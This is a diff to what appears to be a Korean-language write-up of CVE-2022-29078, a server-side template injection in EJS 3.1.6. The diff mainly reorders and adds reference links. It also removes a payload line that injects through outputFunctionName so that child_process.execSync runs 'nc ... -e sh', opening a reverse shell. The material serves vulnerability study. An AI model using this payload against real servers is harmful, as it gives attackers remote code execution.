@@ -67,11 +67,11 @@ app.listen(PORT, () => {
 
 ## Payload
 
-test=AAAA&settings\[view%20options\]\[outputFunctionName\]=x;process.mainModule.require('child_process').execSync('nc%20127.0.0.1%208862%20-e%20sh');x
-
 ## 참고
 
 - [Tistory: CVE-2022-29078 ejs(3.1.6) - outputFunctionName Injection Vulnerability](https://hg2lee.tistory.com/entry/CVE-2022-29078-ejs316-outputFunctionName-Injection-Vulnerability)
+- [Tistory: ejs 3.1.6 ssti](https://minpo.tistory.com/198)
 - [Github Pages: CVE-2022-29078 EJS SSTI RCE](https://dyrandy.github.io/posts/2022/10/31/cve-2022-29078-ejs-ssti-rce/)
 - [Tistory: EJS Server Side Template Injection 취약점 [CVE-2022-29078]](https://one3147.tistory.com/65)
-- [Tistory: ejs 3.1.6 ssti](https://minpo.tistory.com/198)
+- [Github: EJS, Server side template injection ejs@3.1.9 Latest #720](https://github.com/mde/ejs/issues/720)
+- [Blog: EJS Vulnerabilities in CTF](https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/)
